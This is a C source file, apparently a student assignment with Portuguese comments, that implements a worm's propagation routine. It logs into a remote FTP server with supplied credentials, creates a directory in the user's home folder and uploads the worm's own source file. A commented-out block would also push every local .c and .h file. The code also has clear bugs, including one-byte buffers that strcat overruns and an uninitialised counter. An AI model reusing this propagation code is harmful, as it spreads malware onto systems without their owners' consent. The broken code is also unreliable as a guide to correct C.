#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>

void parseIPPort(char buffer[], char *ip, int *port){
    char *token = (char*) malloc(sizeof(char));
    char *aux = (char*) malloc(sizeof(char));
    char *aux2 = (char*) malloc(sizeof(char));
    char *ip_aux = (char*) malloc(sizeof(char));
    char **range = malloc(2*sizeof(char *));
    char *ponto = ".";
    int i = 0, p1 = 0, p2 = 0;
    
    /* get the first token */
    token = strtok(buffer, " ");
   
    /* walk through other tokens */
    while(token != NULL) {
        aux = token;
        token = strtok(NULL, " ");
    }
 
    /* get the first token */
    token = strtok(aux, "(");
    aux2 = strdup(token);
    token = strtok(aux2, ")");
    aux = strdup(token);
    
    /* get the first token */
    token = strtok(aux, ",");
   
    while(token != NULL) {
        range[i] = token;
        token = strtok(NULL, ",");
        i +=1;
    }

    for(i = 0; i < 3; i++){
        strcpy(ip_aux, range[i]);
        strcat(ip_aux, ponto);
        strcat(ip, ip_aux);
    }
    
    strcpy(ip_aux, range[i]);
    strcat(ip, ip_aux);

    p1 = atoi(range[i+1]);
    p2 = atoi(range[i+2]);

    *port = p1*256+p2;
}

void fileTransfer(char *ip, char *username, char *password){
    char buffer[1024], file_buf[512];
    char *ipT = (char*) malloc(sizeof(char));
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char model[10] = "MODE S\n";
    char type[10] = "TYPE I\n";
    char stru[10] = "STRU F\n";
    char pasv[10] = "PASV\n";
    char cwd[100] = "CWD /home/";
    char cwdWD[100] = "CWD Asgn03KLG/\n";
    char pwd[10] = "PWD\n";
    char mkd[20] = "MKD Asgn03KLG\n";
    char storWorm[25] = "STOR worm.c\n";
    char c;
    DIR *dir;
    FILE *arq;
    int i = 0, sent, tam_send = 0, temp, sock = 0, sockT, len = 0, status, size = 0, size2 = 0, port = 0, accept_socket;
    struct sockaddr_in serverAddr, transfSock, server;
    struct dirent *folder;
    struct stat obj;

    //CONNECT FTP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&serverAddr, '0', sizeof(serverAddr));
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(21);

    if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
        printf("Erro: conexao falhou. \n");
        exit(1);
    }
    
    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);    
    printf("%s", user);
    if(send(sock, user, strlen(user), 0) < 0){
        printf("Erro: nome do usuario invalido ou incorreto. \n");
        exit(1);    
    }

    //Resposta do nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando senha
    memset(buffer, '0', 1024);
    strcat(pass, password);
    printf("%s", pass);
    if(send(sock, pass, strlen(pass), 0) < 0){
        printf("Erro: senha invalida \n");
        exit(1);
    } 

    //Resposta da Senha
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Modo de Transferencia: Stream
    memset(buffer, '0', 1024);
    send(sock, model, strlen(model), 0);

    //Resposta do Modo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
 
    //Enviando Tipo de Transferencia: Binario
    memset(buffer, '0', 1024);
    send(sock, type, strlen(type), 0);
    
    //Resposta do Tipo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Estrutura de Dados: F
    memset(buffer, '0', 1024);
    send(sock, stru, strlen(stru), 0);
    
    //Resposta da Estrutura de Dados
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Passive Mode'
    memset(buffer, '0', 1024);
    send(sock, pasv, strlen(pasv), 0);

    //Resposta do Passive Mode
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Parse para pegar IP e Porta
    parseIPPort(buffer, ipT, &port);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    strcat(cwd, username);
    send(sock, cwd, strlen(cwd), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'MKD'
    memset(buffer, '0', 1024);
    send(sock, mkd, strlen(mkd), 0);
    
    //Resposta do 'MKD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    send(sock, cwdWD, strlen(cwdWD), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando Worm.c
    memset(buffer, '0', 1024);
    send(sock, storWorm, strlen(storWorm), 0);

    //CONNECT FTP
    sockT = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&transfSock, '0', sizeof(transfSock));
    transfSock.sin_addr.s_addr = inet_addr(ipT);
    transfSock.sin_family = AF_INET;
    transfSock.sin_port = htons(port);

    if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
        //printf("Erro: conexao falhou. \n");
        perror("");
        exit(1);
    }

    if((arq = fopen("worm.c", "r")) == NULL){
        printf("No such file on the local directory\n\n");
        exit(0);
    }
   
    status = stat("worm.c", &obj); 
    size = obj.st_size;
    temp = size;

    printf("%d", size);
    for(i=0; i<=9; i++ )   {
        buffer[i] =  size%10;
        size = size/10;
        printf("%d", size);
    }
    
    if (send(sockT, buffer, 10, 0) == -1){
        printf("Cant send file size...\n\n");
        exit(1);
    }

    //Resposta do Worm.c
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    memset(file_buf, '0', sizeof(file_buf));
    
    i = 0;

    tam_send = temp / 10;
    
    while(sent <= temp){
        while(i < tam_send){
            c = fgetc(arq);
            file_buf[i] = c;
            i+=1;
        }
        if (send(sockT, file_buf, tam_send, 0) < 0)
        sent++;
        tam_send += tam_send;
    }

    //Resposta do Worm.c
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
 
    if(sock >= 0){
        close(sock);
    }
}

void propagation_engine(char* ip, char *username, char *pass){
    
    fileTransfer(ip, username, pass);

    //catch files names and transfer via put ftp
   /* dir = opendir(".");
    if(dir){
        while(folder = readdir(dir)){
            if(!strcmp(folder->d_name, "."))
                continue;
            if(!strcmp(folder->d_name, ".."))
                continue;

            statFile = open(folder->d_name, O_RDONLY);
            if(statFile == -1){
                printf("No such file on the local directory\n\n");
                exit(0);
            } 

            len = strlen(folder->d_name);
            if (((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".h") == 0) || ((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".c") == 0)){
                strcpy(buffer, "put ");
                strcat(buffer, folder->d_name);
                send(sock, buffer, 100, 0);
                stat(folder->d_name, &obj);
                size = obj.st_size;
                send(sock, &size, sizeof(int), 0);
                sendfile(sock, statFile, NULL, size);
                recv(sock, &statFile, sizeof(int), 0);
                if(statFile)
                    printf("File stored successfully\n");
                else
                    printf("File failed to be stored to remote machine\n");
            }
        }
    }*/

}
